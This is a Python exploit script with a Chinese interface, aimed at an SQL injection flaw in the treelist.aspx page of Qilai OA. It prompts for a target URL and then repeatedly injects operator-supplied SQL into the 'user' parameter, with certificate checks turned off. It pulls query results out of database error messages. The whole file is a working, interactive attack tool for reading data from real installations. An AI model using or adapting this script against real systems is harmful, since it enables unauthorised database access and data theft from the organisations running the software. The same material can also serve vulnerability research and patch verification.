import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mVersion:   启莱OA treelist.aspx SQL注入漏洞                           \033[0m')
    print('+  \033[36m使用格式:  python3 exp.py                                            \033[0m')
    print('+  \033[36murl地址:   http://xxx.xxx.xxx.xxx                                   \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    while True:
        sql = str(input("\033[35m请输入需要执行的sql语句：\033[0m"))
        if sql == "exit":
            break
        vuln_url = target_url + "/client/treelist.aspx?user=' and 1=("+sql+")--&pwd=1"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
        
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
            if "nvarchar" in response.text and response.status_code == 500:
                print("\033[32m[+]目标 {} 存在SQL注入漏洞\033[0m".format(target_url))
                result = re.findall(r"<title>将 nvarchar 值 '"+"(.*)"+"' 转换", response.text)
                print("\033[32m[+]响应为: {}\033[0m".format(result))
            else:
                print("\033[31m[x]目标 {} 不存在漏洞 \033[0m".format(target_url))
        except Exception as e:
            print("\033[31m[x]目标 {} 请求失败 \033[0m".format(target_url))

if __name__ == '__main__':
    title()
    while True:
        target_url = str(input("\033[35m请输入需要检测的url：\033[0m"))
        if len(target_url) != 0 and re.match(r'^https?:/{2}\w.+$', target_url):
            break
    POC_1(target_url)
